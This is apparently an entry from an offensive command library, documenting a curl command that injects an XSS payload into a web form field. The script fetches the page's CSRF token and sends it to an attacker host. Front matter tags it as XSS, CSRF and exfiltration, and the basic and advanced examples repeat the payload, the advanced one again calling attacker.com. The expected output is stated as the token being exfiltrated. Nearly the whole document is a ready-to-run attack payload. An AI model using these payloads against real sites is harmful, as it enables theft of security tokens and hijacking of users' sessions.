---
id: cmd-curl-inject-csrf
data: >-
  curl -X POST https://target.com/██████████_flight/images -d
  "advanced_val=<script>fetch(document.location.origin +
  '/csrf-endpoint').then(r=>r.text()).then(t=>fetch('https://attacker.com/steal?token='
  + encodeURIComponent(t)))</script>" -H "Content-Type:
  application/x-www-form-urlencoded" --cookie "session=valid_session"
tags:
  - web
  - xss
  - csrf
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.755Z'
verified: false
validated: true
submitted: true
---
# curl-inject-csrf-theft-payload

## Command

```bash
curl -X POST https://target.com/██████████_flight/images -d "advanced_val=<script>fetch(document.location.origin + '/csrf-endpoint').then(r=>r.text()).then(t=>fetch('https://attacker.com/steal?token=' + encodeURIComponent(t)))</script>" -H "Content-Type: application/x-www-form-urlencoded" --cookie "session=valid_session"
```

## Description

Injects an advanced XSS payload to fetch and exfiltrate CSRF tokens to an attacker server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d` | Payload with fetch logic | Yes |
| `-H` | Content type | Yes |
| `--cookie` | Session cookie for auth context | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/██████████_flight/images -d "advanced_val=<script>fetch('/token').then(r=>r.text()).then(t=>console.log(t))</script>" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
curl -X POST https://target.com/██████████_flight/images -d "advanced_val=<script>fetch('/csrf').then(r=>r.text()).then(t=>fetch('https://attacker.com?token='+t))</script>" -H "Content-Type: application/x-www-form-urlencoded" --cookie "session=abc123" -v
```

## Expected Output

Reflected payload; token exfiltrated to attacker endpoint upon browser execution.

## Related

- [[Related Procedure|procedures/Verify-XSS-Exploitation-for-CSRF-Theft]]
